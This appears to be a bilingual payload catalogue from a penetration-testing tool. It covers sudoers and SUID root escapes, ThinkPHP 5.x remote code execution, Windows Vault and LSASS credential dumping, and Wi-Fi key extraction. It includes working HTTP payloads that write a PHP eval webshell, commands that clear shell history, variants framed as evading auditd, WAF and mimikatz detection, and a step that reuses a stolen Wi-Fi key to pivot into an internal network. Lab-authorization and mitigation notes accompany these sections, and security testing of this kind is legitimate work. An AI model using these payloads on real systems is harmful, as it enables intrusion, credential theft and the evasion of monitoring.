name.zh: Sudoers 最小权限审计

description.zh: 审计 sudoers 规则（NOPASSWD、ALL 与受限命令），验证 sudo 提权路径。
description.en: Parses sudoers for NOPASSWD and overly broad grants to editors and search tools, then uses a documented shell escape from such a program to obtain a passwordless root session.

overview.zh: 该 Payload 覆盖 Sudoers 最小权限审计场景，检验当前用户 NOPASSWD 授权项的可滥用逃逸面。验证维度含授权枚举、常见程序逃逸与非交互核对三步，对应第 1 至第 3 步。
overview.en: This payload covers sudoers least-privilege auditing, testing escape surfaces of the current user's NOPASSWD grants. Validation covers grant enumeration, common-program escapes and non-interactive verification, mapped to steps 1 through 3.

vulnerability.zh: 根因在于 sudoers 为编辑器、查找类工具授予无限制 root 权限：这类程序自带 shell 逃逸，用户免密即可获得完整 root 会话，最小权限原则失效。
vulnerability.en: The root cause is sudoers granting unrestricted root to editors and search-class tools with built-in shell escapes: users get a full root session passwordlessly, voiding least privilege.

exploitation.zh: 第 1 步以 sudo -l 列出当前授权，锁定 NOPASSWD 条目；第 2 步按脚本对 vim、find、awk 等授权程序逐一执行已知逃逸，取得 root Shell 即确认对应路径；第 3 步以 sudo -n -l 非交互模式复核清单以支撑自动化巡检。以 root 身份回显为成功判据。占位符在全局变量菜单替换；逃逸验证仅执行 id 等只读命令。
exploitation.en: In step 1, list current grants with sudo -l and lock onto NOPASSWD entries. In step 2, run known escapes for authorized programs such as vim, find and awk per the script; a root shell confirms the path. In step 3, recheck the list non-interactively with sudo -n -l to support automated audits. Judge success by root-identity output. Replace placeholders via the global variables menu; run read-only commands like id during escape verification.

mitigation.zh:
sudoers 收敛为命令+参数白名单，禁止编辑器/查找类工具全权授权，开启输入输出日志与会话录制：
    Cmnd_Alias OPS = /usr/bin/systemctl restart nginx, /usr/bin/cat /var/log/app/*
    dev ALL=(root) NOPASSWD: OPS
    Defaults log_input, log_output, iolog_dir=/var/log/sudo-io/%{user}
    visudo -cf /etc/sudoers
mitigation.en: Narrow sudoers to argument allowlists, forbid blanket editor-class grants, and enable sudo logging with session recording. After the fix, replay step 2: escape attempts should be denied with traceable logs.

description.zh: 用 sudo -l 列出当前用户全部授权；出现 root 且 NOPASSWD 的命令即锁定可滥用的提权入口，重点关注带通配符或编辑器的条目。
description.en: List grants with sudo -l; root NOPASSWD entries mark the abusable escalation doors, especially wildcards and editors.

description.zh: 用 sudo -n -l 在脚本环境复核免密授权清单；输出完整命令与参数限制即可判断是否存在参数注入或 shell 逃逸空间。
description.en: Re-check with sudo -n -l inside scripts; the full command and argument constraints reveal room for argument injection or shell escapes.

description.zh: 对 vim、find、awk 等授权程序运行已知逃逸语法；获得 root shell 即完成 sudo 提权闭环，可继续横向或读取敏感文件。
description.en: Run known escapes against granted vim, find and awk; a root shell closes the sudo escalation loop for further movement.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 Sudoers 最小权限审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Sudoers Least-Privilege Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: Sudoers 最小权限审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Sudoers Least-Privilege Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: sudo 逃逸获得 root 会话——会话内只跑只读验证命令；sudoers 问题项在报告中标注，不改原配置。
opsecTips.en: A sudo escape yields a root session — run read-only verification commands inside it, and flag sudoers findings in the report without touching the original configuration.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

title.zh: 规避变体：CVE-2019-14287 用户号绕过

description.zh: 规避点：sudo<1.8.28 以 #uid=-1 语法绕过用户白名单。判据：直接得到 root shell。
description.en: Exploits the -1 uid parsing to bypass allowlists on old sudo. Success: root shell.

title.zh: 规避变体：env 链式提权

description.zh: 规避点：sudoers 授权 env 时以环境执行器转 shell，命令行无 vim/find 特征。判据：root shell。
description.en: env is allowed, spawns a shell without classic GTFOBins signatures. Success: root shell.

title.zh: 规避变体：less 读密 + shell

description.zh: 规避点：以阅读密文件为掩护进入 pager 后执行 !sh。判据：显示哈希并得到 shell。
description.en: Reading shadow as cover, then !sh inside the pager. Success: hashes shown and shell obtained.

title.zh: 规避变体：静默授权探测

description.zh: 规避点：-n 免密码提示、管道过滤减少输出曝光。判据：列出可免密命令。
description.en: Non-interactive probe with filtered output. Success: passwordless commands listed.

description.zh: 以 sudo -l 列出授权；root NOPASSWD 条目即锁定免密提权命令。
description.en: List grants with sudo -l; root NOPASSWD entries pin password-less escalation commands.

description.zh: 对授权程序逐一验证已知逃逸；获得 root shell 即确认对应 sudo 提权路径。
description.en: Validate known escapes per granted program; a root shell confirms that sudo escalation path.

title.zh: 列出当前用户 sudo 授权
title.en: List the current user's sudo grants

description.zh: 以非交互模式列出当前用户可执行的 sudo 命令清单，识别可被滥用的授权项。
description.en: Lists the sudo commands the current user may run in non-interactive mode, identifying grants that can be abused.

name.zh: SUID 文件权限边界审计

description.zh: 全盘枚举 SUID 二进制并对照 GTFOBins 利用清单，验证 SUID 提权面。
description.en: Enumerates SUID binaries across the filesystem, cross-checks them against GTFOBins escape techniques, and exercises a shell escape to prove the SUID privilege boundary.

overview.zh: 该 Payload 覆盖 SUID 文件权限边界审计场景，检验 root 属主 SUID 程序的可滥用面。验证维度含全盘定位、常见程序逃逸验证与受限目录枚举三步，对应第 1 至第 3 步。
overview.en: This payload covers SUID file-permission boundary auditing, testing the abusable surface of root-owned SUID programs. Validation covers full-disk discovery, known-escape verification and restricted-directory enumeration, mapped to steps 1 through 3.

vulnerability.zh: 根因在于非常规程序被赋予 SUID 位或管理员对交互式工具授权失当：具备 shell 逃逸能力的 SUID 程序被普通用户调用时直接以 root 执行任意命令。
vulnerability.en: The root cause is unusual binaries carrying the SUID bit or admin misgranting interactive tools: SUID programs with shell escapes execute arbitrary commands as root when invoked by standard users.

exploitation.zh: 第 1 步用 find 全盘定位 SUID 文件，锁定 root 属主且不在基线清单的候选；第 2 步按脚本对 nmap、vim、find 等已知逃逸程序逐一验证，取得 root Shell 即确认对应路径；第 3 步对 usr 目录受限范围再次枚举并输出前 50 项用于交叉核对。以 root 身份回显为成功判据。占位符在全局变量菜单替换；测试 Shell 仅执行只读命令。
exploitation.en: In step 1, locate SUID files disk-wide with find, locking onto root-owned candidates absent from the baseline list. In step 2, verify known escapes for nmap, vim and find per the script; a root shell confirms the corresponding path. In step 3, re-enumerate within usr directories and print the first 50 entries for cross-checking. Judge success by root-identity output. Replace placeholders via the global variables menu; run read-only commands in test shells.

mitigation.zh:
移除非必要 SUID 位并基线比对监控变更，用户可写分区 nosuid 挂载，交互式工具一律不授权 SUID：
    find / -perm -4000 -type f -printf '%m %u %p\n' | sort > /root/suid.baseline
    chmod u-s /usr/bin/nmap /usr/bin/vim /usr/bin/find
    echo '/home ext4 defaults,nosuid 0 2' >> /etc/fstab
    mount -o remount,nosuid /home
mitigation.en: Strip unneeded SUID bits, monitor changes against a baseline, and mount user-writable partitions nosuid. After the fix, replay steps 1 and 2: stray bits should be gone and escapes fail.

title.zh: 全盘枚举 SUID 文件

description.zh: 用 find 按 -perm -4000 扫描全盘可执行文件；输出 root 属主且非常规路径的 SUID 程序清单即锁定提权候选集合。
description.en: Scan the filesystem with find -perm -4000; root-owned SUID binaries outside the usual directories form the escalation shortlist.

title.en: Refine the hunt in standard directories

description.zh: 限定 /usr/bin 与 /usr/local/bin 精确列出 SUID 二进制；逐条与 GTFOBins 匹配圈定带已知利用方式的程序，缩小攻击面。
description.en: List SUID binaries precisely under /usr/bin and /usr/local/bin and match each against GTFOBins; known-abusable programs shrink the target list.

title.zh: 利用 SUID 逃逸拿 root shell
title.en: Escape to a root shell via SUID

description.zh: 对候选程序运行 nmap 交互模式、vim 的 bang 命令、find 的 exec 参数等已知逃逸语法；获得 euid 为 root 的 shell 即完成提权。
description.en: Fire known escapes such as nmap interactive, vim :! and find -exec against the shortlist; a shell with euid=root completes the escalation.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 SUID 文件权限边界审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for SUID File-Permission Boundary Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: SUID 文件权限边界审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: SUID File-Permission Boundary Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: SUID 利用产生 root 进程——只执行 id/marker 类命令验证；发现的意外 SUID 项写报告而非留存利用脚本。
opsecTips.en: SUID exploits spawn root processes — verify with id or marker commands only, and report unexpected SUID entries rather than leaving exploit scripts behind.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 规避点：限定目录替代全盘扫描，减少 auditd 规则命中。判据：枚举结果正常返回。
description.en: Scopes the scan to reduce auditd hits. Success: enumeration returns normally.

title.zh: 规避变体：解释器提权替代

description.zh: 规避点：SUID python 路径替代 find/vim 等高频告警二进制。判据：得到 root shell。
description.en: Uses a SUID python instead of noisy find/vim paths. Success: root shell.

title.zh: 规避变体：perl 提权路径

description.zh: 规避点：SUID perl 变体扩大绕过面。判据：euid 为 0。失效条件：现代 perl 检测到 setuid/euid≠ruid 直接拒绝执行（suidperl 已移除多年），「euid 为 0」仅在历史发行版成立。
description.en: SUID perl variant widens coverage. Success: euid 0.Failure condition: modern perl detects setuid with euid differing from ruid and refuses to run (suidperl was removed years ago), so the euid-0 criterion holds only on historical distributions.

title.zh: 规避变体：无痕 shell 环境

wafBypass.command:
exec /bin/sh -p
unset HISTFILE HISTSIZE; export HISTSIZE=0; history -c

description.zh: 规避点：exec 替换进程避免父子树检测并清历史。判据：无 history 记录且 shell 可用。
description.en: exec replaces the process tree and clears history. Success: shell works with no history records.

description.zh: 查找全盘 SUID 文件；输出 root 属主的非常规 SUID 程序清单即锁定提权候选。
description.en: Find SUID files disk-wide; the printed list of unusual root-owned SUID programs pins escalation candidates.

description.zh: 对候选程序逐一验证已知利用；拿到 root shell 即确认对应 SUID 提权路径。
description.en: Validate known techniques per candidate; obtaining a root shell confirms that SUID escalation path.

title.zh: 枚举 SUID 二进制文件

description.zh: 搜索 /usr/bin 与 /usr/local/bin 下的 SUID 文件并输出前 50 个，圈定可进一步核查的提权候选。
description.en: Finds SUID files under /usr/bin and /usr/local/bin, printing the first 50 as elevation candidates for further review.

name.zh: ThinkPHP 版本与路由执行回归

description.zh: 覆盖 ThinkPHP 多版本 RCE 验证：从 TP5.0 invokeFunction 与 TP5.1 路由执行，到 captcha 模块 __construct 触发 RCE，再到版本指纹与路由探测，并附编码与入口变形绕过。
description.en: Covers RCE validation across ThinkPHP versions: from TP5.0 invokeFunction and TP5.1 route execution through captcha-module __construct RCE to version fingerprinting and route probing, with encoding and entry-mutation bypasses.

overview.zh: ThinkPHP 版本与路由执行回归针对 ThinkPHP 多版本路由到动态调用的 RCE 场景。覆盖 TP5.0 invokeFunction、TP5.1 路由执行、captcha 模块 __construct 触发与版本指纹探测四类验证维度，并附编码与入口变形绕过。
overview.en: The ThinkPHP version and route-execution regression targets multi-version ThinkPHP RCE via routing into dynamic invocation. It covers four verification dimensions—TP5.0 invokeFunction, TP5.1 route execution, captcha-module __construct triggering, and version fingerprinting—plus encoding and entry-point variant bypasses.

vulnerability.zh: 根因是受影响版本未过滤路由中的控制器与方法名，或 Request 属性可被 _method 覆盖后进入 filter 回调，用户输入因此到达 call_user_func_array、system 等动态调用与命令执行边界。
vulnerability.en: The root cause is affected versions failing to filter controller and method names in routes, or Request properties being overridden via _method into filter callbacks—user input therefore reaches dynamic invocation and command-execution boundaries such as call_user_func_array and system.

exploitation.zh: 按 Payload 列表顺序使用：先以第 4 步验版本；TP5.0.x 用第 1 步 invokefunction 路由调用 call_user_func_array 执行 system、写 shell.php；TP5.1.x 用第 2 步三条路由验证；captcha 用第 3 步提交 _method=__construct 加 filter[]=system。id 返回 uid= 或 shell.php 可达即命中；被拦时改用编码与入口变形。
exploitation.en: Use payloads in list order: confirm the version with step 4 first; for TP5.0.x use step 1's invokefunction route to call call_user_func_array, run system, and write shell.php; for TP5.1.x verify with step 2's three routes; with captcha, POST _method=__construct plus filter[]=system per step 3. A hit is id returning uid= or shell.php reachable; if blocked, use encoding and entry-point variants.

mitigation.en: Upgrade to vendor-supported versions with patches, disable production debug and dynamic invocation, and restrict route parameters and allowed types; pair with a WAF that normalizes encodings. After the fix, replay the step 1-3 route payloads and confirm 404s or filtered parameters, with step-4 fingerprinting no longer revealing version details.

description.zh: 从 X-Powered-By 与响应特征确认 ThinkPHP 版本，探测 init 与 input 路由可达性。命中判据：版本与可用路由入口明确。
description.en: Read X-Powered-By and probe init/input routes to pin the version. Success: version and reachable routes are known.

description.zh: 经 invokefunction 路由调用 call_user_func_array 执行 phpinfo 并写入 Shell。命中判据：返回 phpinfo 页面或 Shell 成功落盘可访问。
description.en: Drive call_user_func_array through invokefunction to run phpinfo and drop a shell. Success: phpinfo returns or shell lands.

description.zh: 对 5.1 目标用 input、Container 与 Template 三条路由执行命令或写 Shell。命中判据：id 返回 uid=… 或 Shell 可访问。
description.en: On 5.1 use input/Container/Template routes to run commands or write a shell. Success: uid= returns or shell is reachable.

description.zh: 向 captcha 路由提交 _method=__construct 覆盖 Request 属性，经 filter 执行命令。命中判据：命令输出返回响应。
description.en: POST _method=__construct to the captcha route to overwrite Request and run via filter. Success: command output returns.

attackChain.payload:
POST /index.php?s=captcha HTTP/1.1 
 Content-Type: application/x-www-form-urlencoded 
 _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id 
 _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo '<?php eval($_POST[cmd]);?>' > shell.php

title.en: Evade via encoding and case tricks

description.zh: 路由被拦截时用 URL 编码、双重编码与大小写变形重新投递请求。命中判据：变形后的路由仍能触发命令执行。
description.en: When routes are blocked, retry with URL/double encoding and case variants. Success: the mutated route still fires.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 ThinkPHP 版本与路由执行回归 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for ThinkPHP Version and Route-Execution Regression are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

analysis.zh: ThinkPHP 版本与路由执行回归只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: ThinkPHP Version and Route-Execution Regression is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: invokeFunction 载荷真实执行代码——动作限定 marker；版本指纹探测请求限速避免日志洪水。
opsecTips.en: invokeFunction payloads really execute code — keep actions to marker commands, and throttle fingerprint probes to avoid log floods.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

description.zh: 对 invokefunction 路径分别施加单次编码、类名大小写变形与双重编码，验证仅匹配明文路由的防护规则可被绕过。
description.en: Apply single encoding, class-name case variants, and double encoding to the invokefunction path, verifying defenses matching only the plaintext route are evaded.

explanation.zh: URL 编码的路径分隔符 /

description.zh: 以大小写、无前导斜杠与不同入口文件（/index.php、/public/index.php）形式重放 invokefunction 路由，验证路径归一化差异导致的绕过。
description.en: Replay the invokefunction route with case variants, no leading slash, and different entry files (/index.php, /public/index.php), exposing bypasses caused by path-normalization differences.

explanation.zh: 命名空间分隔符用反斜杠的控制器写法
explanation.en: Controller path written with namespace backslashes

explanation.zh: 正斜杠形式的控制器写法
explanation.en: Controller path written with forward slashes

explanation.zh: 公共入口文件的替代路径
explanation.en: Alternative entry path via the public directory

description.zh: 经 invokefunction 路由调用 call_user_func_array 执行 phpinfo/system 并写入 shell.php，验证 TP5.0.x 未过滤控制器名的远程代码执行。
description.en: Call call_user_func_array through the invokefunction route to run phpinfo/system and write shell.php, verifying TP5.0.x RCE via an unfiltered controller name.

description.zh: 以 input、invokefunction 与 Template write 三条路由执行 system 命令或写入 shell.php。命中判据：id 返回 uid=… 或 shell.php 写入成功且可访问。
description.en: Uses the input, invokefunction, and Template write routes to run system commands or drop shell.php. Success check: id returns uid=... or shell.php is written and reachable.

execution.command:
POST /index.php?s=captcha HTTP/1.1 
 Content-Type: application/x-www-form-urlencoded 
 _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id 
 _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo '<?php eval($_POST[cmd]);?>' > shell.php

description.zh: 向 /index.php?s=captcha 提交 _method=__construct 覆盖 Request 属性，经 filter[]=system 执行命令或写入 WebShell。
description.en: Post _method=__construct to /index.php?s=captcha to overwrite Request properties, executing commands via filter[]=system or writing a webshell.

title.zh: TP 版本指纹与路由探测
title.en: TP version fingerprint and route probing

description.zh: 以 X-Powered-By: ThinkPHP 响应头（存在时）或错误页/默认页中的 ThinkPHP 版本标识确认版本，并探测 \think\app/init 与 \think\Request/input 两条路由的可达性，为后续向量选择提供依据。
description.en: Confirm the ThinkPHP version via the X-Powered-By header and probe reachability of the \think\app/init and \think\Request/input routes to guide vector selection.

relatedExploits.name: ThinkPHP 5.x 路由正则缺陷远程代码执行
ThinkPHP 多语言特性本地文件包含远程代码执行

name.zh: Windows Vault/凭据管理器枚举

description.zh: 枚举 Windows Vault 与凭据管理器条目，验证通用凭据的存储与访问边界。
description.en: Enumerates Windows Vault and Credential Manager entries and decrypts them in the same user context, showing that browser- and application-saved passwords are protected only by DPAPI under that context.

subCategory.zh: 本机注册表与保护存储

overview.zh: 该 Payload 覆盖 Windows Vault 类型与访问审计场景，检验凭据管理器家族与内存凭据的可枚举提取面。验证维度含 Vault 家族枚举、条目清单与内存提取三步，对应第 1 至第 3 步。
overview.en: This payload covers Windows Vault type and access auditing, testing enumeration and extraction across credential-manager families and in-memory credentials. Validation covers vault-family enumeration, entry listing and memory extraction, mapped to steps 1 through 3.

vulnerability.zh: 根因在于 Vault 条目以用户上下文 DPAPI 保护且 LSASS 内存保留凭据管理器密钥：同上下文攻击者枚举条目后即可解密提取，浏览器与应用保存的口令随之暴露。
vulnerability.en: The root cause is Vault entries protected by user-context DPAPI while LSASS memory retains credential-manager keys: an in-context attacker enumerates entries then decrypts them, exposing browser and application saved passwords.

exploitation.zh: 第 1 步用 vaultcmd 的 list 模式列出全部 Vault 家族即枚举完成；第 2 步以 listcreds 展开 Windows Credentials 条目，输出凭据资源与身份即确认可提取项；第 3 步用 mimikatz 的 sekurlsa::credman 从内存提取凭据管理器密钥，输出用户名与口令即确认完整泄露链。以提取的凭据对为成功判据。占位符在全局变量菜单替换。
exploitation.en: In step 1, list all vault families with vaultcmd's list mode. In step 2, expand Windows Credentials entries with listcreds; credential resources and identities confirm extractable items. In step 3, pull credential-manager keys from memory with mimikatz sekurlsa::credman; username and password output completes the leak chain. Judge success by extracted credential pairs. Replace placeholders via the global variables menu.

mitigation.zh:
清理终端存量保存凭据并禁用浏览器口令保存，启用 LSA 保护（PPL）与 LSASS 访问审计：
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v PasswordManagerEnabled /t REG_DWORD /d 0 /f
    reg add "HKLM\SOFTWARE\Policies\Google\Chrome" /v PasswordManagerEnabled /t REG_DWORD /d 0 /f
    reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 1 /f
    修复后重放第 2、3 步，条目清单应为空且内存提取被 PPL 阻断。
mitigation.en: Purge saved credentials from endpoints, disable browser password saving, and enable LSA protection with LSASS access auditing. After the fix, replay steps 2 and 3: the entry list should be empty and memory extraction blocked by PPL.

description.zh: 用 vaultcmd 的 list 模式列出本机全部 Vault；输出 Windows Credentials 等容器名即确认凭据存储结构，圈定后续窃取范围。
description.en: List all Vaults with vaultcmd /list; container names like Windows Credentials map out the credential stores to loot.

title.zh: 列出 Vault 凭据条目

description.zh: 用 vaultcmd 的 listcreds 模式列出 Windows Credentials 全部条目；输出资源与身份信息即定位高价值窃取目标，如域账号与常用站点。
description.en: Dump Windows Credentials entries with vaultcmd /listcreds; resource and identity lines pinpoint high-value targets such as domain accounts.

description.zh: 用 mimikatz 的 sekurlsa::credman 从 LSASS 提取凭据管理器缓存；输出用户名与明文口令即绕过 Vault 自身加密完成凭据收割。
description.en: Extract the credential-manager cache from LSASS with sekurlsa::credman; usernames with plaintext flow out, skipping Vault's own encryption entirely.

An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: Vault 条目解密后即丢弃，不在共享会话内执行枚举避免凭据跨用户暴露。
opsecTips.en: Discard decrypted vault entries immediately and avoid running enumeration inside shared sessions where credentials could leak across users.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

title.zh: LSA 内存侧取规避变体

description.zh: 绕过 vaultcmd 落地日志与 Vault API 调用审计：token::elevate 后从 LSASS 内存导出凭据管理器条目。成功判据：输出含保存的明文凭据。
description.en: Evades vaultcmd logging and Vault API auditing by reading Credential Manager entries straight from LSASS memory. Success: output contains saved plaintext credentials.

title.zh: SharpVault API 调用规避变体

description.zh: 绕过 mimikatz 进程名特征：C# 直接调 VaultEnumerateVaults/VaultEnumerateItems。成功判据：返回 Vault 条目清单。
description.en: Evades the mimikatz process-name signature by calling VaultEnumerateVaults/VaultEnumerateItems directly from C#. Success: the vault entry list returns.

title.zh: vaultcmd 参数变形规避变体

wafBypass.command: vaultcmd /listcreds:"Windows 凭据" /all 2>nul & vaultcmd /listcreds:"Web 凭据" /all

description.zh: 绕过英文名称匹配的审计规则：以本地化 Vault 名变形查询。成功判据：两类凭据条目均返回。
description.en: Evades audit rules matching English names by querying with localized vault names. Success: both credential classes return entries.

description.zh: 用 vaultcmd /list 列出 Vault；输出各 Vault 家族即枚举完成。
description.en: List vaults with vaultcmd /list; the printed vault families complete enumeration.

description.zh: 列出 Windows Credentials Vault 条目；输出凭据资源与身份条目即确认存在可提取项。
description.en: List the Windows Credentials vault entries; printed credential resources and identities confirm extractable items.

description.zh: 用 sekurlsa::credman 从内存提取凭据管理器密钥；输出用户名与口令即确认内存凭据可读。
description.en: Extract credential-manager secrets from memory with sekurlsa::credman; printed usernames and passwords confirm readable in-memory credentials.

name.zh: WLAN Profile 明文密钥导出

description.zh: 以管理员导出 WLAN Profile XML（key=clear），验证 Wi-Fi 共享密钥的本地保护强度。
description.en: Exports saved WLAN profiles as XML with key=clear under administrator rights, proving the wireless passphrase is readable in plaintext from any local account once the endpoint is compromised.

overview.zh: 该 Payload 覆盖 Wi-Fi 配置元数据审计场景，检验本机 WLAN 配置文件口令的可提取性。验证维度含配置文件枚举与明文密钥显示两步，对应第 1 至第 2 步。
overview.en: This payload covers Wi-Fi configuration metadata auditing, testing extractability of WLAN profile passphrases on the host. Validation covers profile enumeration and plaintext key display, mapped to steps 1 and 2.

vulnerability.zh: 根因在于系统接口允许任意本机用户以 key=clear 读回已保存的无线口令：终端一旦失陷，企业无线口令即暴露，攻击者可就近接入内部网络。
vulnerability.en: The root cause is the system interface letting any local user read saved wireless passphrases with key=clear: once a host falls, corporate wireless passphrases surface and attackers can join the internal network on-site.

exploitation.zh: 第 1 步用 netsh wlan show profiles 列出接口下全部配置文件名；第 2 步对目标配置文件以 key=clear 显示，输出安全密钥明文即确认口令可本机提取，记录 SSID、认证类型与加密方式留证。以明文密钥为成功判据。占位符在全局变量菜单替换；提取范围仅限授权终端。
exploitation.en: In step 1, list all profile names under the interface with netsh wlan show profiles. In step 2, show the target profile with key=clear; a plaintext security key confirms local extraction, and record SSID, authentication and cipher for evidence. Judge success by the plaintext key. Replace placeholders via the global variables menu; limit extraction to authorized endpoints.

mitigation.zh:
企业网络改用 802.1X/WPA2-Enterprise 证书认证替代共享 PSK，删除存量 PSK 配置并限制本机配置文件读取：
    netsh wlan delete profile name="Corp-PSK"
    netsh wlan set profileparameter name="Corp-Ent" authentication=WPA2 encryption=AES
    netsh wlan add profile filename="corp-dot1x.xml" user=all   # 域 GPO 统一下发企业配置
    修复后重放第 2 步，共享口令应不存在或已轮换失效。
mitigation.en: Move enterprise networks to 802.1X certificate authentication instead of shared PSKs, rotate any unavoidable PSKs regularly, and restrict local profile reads. After the fix, replay step 2: shared passphrases should be absent or rotated invalid.

title.zh: 枚举 WLAN 配置文件

description.zh: 用 netsh wlan 的 show profiles 列出接口下全部配置文件；输出 SSID 清单即锁定可提取口令的无线网络目标，优先企业内网热点。
description.en: List every profile with netsh wlan show profiles; the SSID list marks which wireless networks have extractable keys, corporate SSIDs first.

description.zh: 对目标 SSID 以 key=clear 参数显示完整配置；输出关键内容字段中的明文安全密钥即可复制到其他设备，直接接入目标内网无线网络。
description.en: Show the target SSID with key=clear; the plaintext security key in the output can be copied to another device for direct internal network access.

attackChain.payload: netsh wlan show profile name="{LAB_SSID}" key=clear

title.zh: 复用密钥接入内网横向
title.en: Reuse the key to pivot into the network

description.zh: 把提取的密钥配置到攻击设备接入目标无线网络；接入后扫描内网网段定位存活主机与服务，将无线入口转化为内网横向移动的立足点。
description.en: Configure the extracted key on the attacker device to join the network; scanning the internal subnet from there turns wireless access into a pivot point.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 Wi-Fi 配置元数据审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Wi-Fi Profile Metadata Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: Wi-Fi 配置元数据审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Wi-Fi Profile Metadata Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 导出的 WLAN profile 含明文口令——验证后立即从工作目录删除，不连接生产 SSID。
opsecTips.en: Delete exported WLAN profiles right after verification since they carry plaintext passphrases, and never join production SSIDs.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

wafBypass.command: netsh wlan export profile folder=C:\Windows\Temp\ key=clear

description.zh: 绕过逐 profile 交互查询的重复特征：一次性导出全部含明文密钥的 XML。成功判据：导出文件含 keyMaterial 明文。
description.en: Evades repeated per-profile query signatures by exporting all profiles with clear keys to XML in one shot. Success: exported files contain plaintext keyMaterial.

title.zh: 单 profile 定向规避变体

wafBypass.command: netsh wlan show profile name="{LAB_SSID}" key=clear | findstr /i "关键内容 key content"

description.zh: 绕过全量枚举的审计关注：仅定向提取目标 SSID 密钥。成功判据：输出目标网络明文密钥。
description.en: Evades audit focus on bulk enumeration by extracting only the target SSID key. Success: the target network's plaintext key is output.

wafBypass.command: powershell -nop -c "netsh wlan show profile name='{LAB_SSID}' key=clear | Select-String -Pattern 'Key Content|关键内容'"

